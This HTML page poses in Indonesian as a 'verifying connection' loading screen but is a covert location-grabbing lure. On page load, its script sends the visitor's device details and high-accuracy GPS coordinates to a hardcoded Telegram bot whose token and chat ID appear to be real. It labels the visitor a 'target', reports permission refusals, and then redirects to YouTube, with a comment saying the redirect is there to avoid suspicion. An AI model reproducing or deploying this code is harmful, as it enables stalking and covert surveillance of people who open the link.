<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Memverifikasi Koneksi...</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f7f9fc; color: #333; }
        .spinner { border: 4px solid rgba(0, 0, 0, 0.1); width: 36px; height: 36px; border-radius: 50%; border-left-color: #007bff; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { margin-top: 15px; font-size: 14px; color: #666; }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <p>Sedang menghubungkan ke server aman...</p>

    <script>
        // --- DATA ANDA ---
        const TELEGRAM_TOKEN = "8792868527:AAE4eltXO4eY-qgIOwrk4Tirf5qrhAdgUbQ";
        const CHAT_ID = "1354234561";

        function kirimLaporan(pesan) {
            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}&parse_mode=Markdown`;
            fetch(url);
        }

        function dapatkanInfoPerangkat() {
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            return `рџ“± *Info Perangkat:*\n\`${userAgent}\`\nPlatform: \`${platform}\``;
        }

        function init() {
            // Kirim info perangkat segera saat link dibuka
            kirimLaporan("вљЎ *Link Dibuka!*\n" + dapatkanInfoPerangkat());

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const acc = position.coords.accuracy;
                        const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                        
                        const laporan = `рџ“Ќ *Target Terdeteksi!*\n\n` +
                                        `рџЊђ Lat: \`${lat}\`\n` +
                                        `рџЊђ Lon: \`${lon}\`\n` +
                                        `рџЋЇ Akurasi: \`${acc} meter\`\n\n` +
                                        `рџ—є [Buka di Google Maps](${mapsUrl})`;
                        
                        kirimLaporan(laporan);
                        
                        // Opsional: Setelah dapat lokasi, pindahkan ke YouTube agar tidak curiga
                        setTimeout(() => {
                           window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; 
                        }, 2000);
                    },
                    (error) => {
                        let msg = "";
                        switch(error.code) {
                            case error.PERMISSION_DENIED: msg = "вљ пёЏ Target menolak izin lokasi."; break;
                            case error.POSITION_UNAVAILABLE: msg = "вљ пёЏ Informasi lokasi tidak tersedia."; break;
                            case error.TIMEOUT: msg = "вљ пёЏ Waktu permintaan lokasi habis."; break;
                        }
                        kirimLaporan(msg);
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                kirimLaporan("вќЊ Browser tidak mendukung Geolocation.");
            }
        }

        window.onload = init;
    </script>
</body>
</html>
